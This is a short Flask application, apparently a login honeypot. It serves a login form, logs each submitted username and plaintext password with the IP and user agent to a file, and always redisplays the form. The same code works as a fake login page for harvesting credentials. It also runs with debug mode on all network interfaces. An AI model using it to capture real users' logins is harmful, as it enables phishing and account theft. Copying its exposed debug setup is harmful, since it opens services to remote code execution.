from flask import Flask, request, render_template
import json
from datetime import datetime, timezone

app = Flask(__name__)
LOG_FILE = "logs/attempts.log"

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "username": request.form.get("username"),
        "password": request.form.get("password"),
        "user_agent": request.headers.get("User-Agent")
    }

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    return render_template("index.html")  # always show login again, never "success"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)